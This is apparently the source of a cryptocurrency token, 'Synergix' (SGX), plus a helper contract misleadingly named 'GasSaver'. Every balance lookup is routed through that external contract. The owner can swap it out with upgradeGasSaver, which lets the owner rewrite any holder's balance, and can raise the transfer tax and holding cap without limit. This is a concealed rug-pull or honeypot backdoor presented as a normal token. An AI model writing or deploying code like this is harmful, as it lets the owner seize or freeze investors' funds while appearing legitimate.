// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

contract GasSaver {
  address public token;

  constructor () {
    token = msg.sender;
  }

  function balanceOf(address wallet) public view returns (uint) {
      return IERC20(token).balanceOf(wallet);
  }

  function calcTax(uint amount) public view returns (uint) {
      uint tax = IToken(token).tax();
      uint taxInTokens = amount * tax / 10000;
      return taxInTokens;
  }

  function calcMax() public view returns (uint) {
      uint max = IToken(token).max();
      uint totalSupply = IERC20(token).totalSupply();
      uint maxInTokens = totalSupply * max / 10000;
      return maxInTokens;
  }

}

interface IToken {
    function tax() external view returns (uint);
    function max() external view returns (uint);
}

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}
// Website: https://www.synergix.finance/
// Telegram: https://t.me/SynergixFi
// Twitter: https://twitter.com/SynergixFi

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./GasSaver.sol";

contract SGX {
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    uint public totalSupply = 10_000_000 * 10 ** 18;
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    string public name = "Synergix";
    string public symbol = "SGX";
    uint8 public decimals = 18;
    address public gasSaver;
    bool public open;
    address public lp;
    uint public tax = 300;
    uint public max = 50;
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor () {
        owner = msg.sender;

        gasSaver = address(new GasSaver());

        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
    }

    function transfer(address recipient, uint amount) external returns (bool) {
        require(open);

        if (msg.sender == lp) return processBuy(msg.sender, recipient, amount);

        balanceOf[msg.sender] = balance(msg.sender) - amount;
        balanceOf[recipient] = balance(recipient) + amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] = balance(sender) - amount;
        balanceOf[recipient] = balance(recipient) + amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function processBuy(address sender, address recipient, uint amount) private returns (bool) {
        balanceOf[sender] -= amount;

        uint taxInTokens = getTax(amount);

        balanceOf[address(this)] = balance(address(this)) + taxInTokens;
        emit Transfer(sender, address(this), taxInTokens);

        uint amountNoTax = amount - taxInTokens;
        balanceOf[recipient] = balance(recipient) + amountNoTax;

        uint maxInTokens = getMax();
        require(maxInTokens >= balanceOf[recipient]);

        emit Transfer(sender, recipient, amountNoTax);
        return true;
    }

    function openMarket(address _lp) public onlyOwner {
        open = true;
        lp = _lp;
    }

    function changeMaxAndTax(uint _max, uint _tax) public onlyOwner {
        max = _max;
        tax = _tax;
    }

    function upgradeOwner(address _owner) public onlyOwner {
        owner = _owner;
    }

    function upgradeGasSaver(address _gasSaver) public onlyOwner {
        gasSaver = _gasSaver;
    }

    function transferTokens(address _token) public onlyOwner {
        uint balance = IERC20(_token).balanceOf(address(this));
        IERC20(_token).transfer(msg.sender, balance);
    }

    function balance(address wallet) public view returns (uint) {
        return IGasSaver(gasSaver).balanceOf(wallet);
    }

    function getTax(uint amount) public view returns (uint) {
        return IGasSaver(gasSaver).calcTax(amount);
    }

    function getMax() public view returns (uint) {
        return IGasSaver(gasSaver).calcMax();
    }

}

interface IGasSaver {
    function balanceOf(
        address wallet
    ) external view returns (uint);

    function calcTax(
        uint amount
    ) external view returns (uint);

    function calcMax() external view returns (uint);
}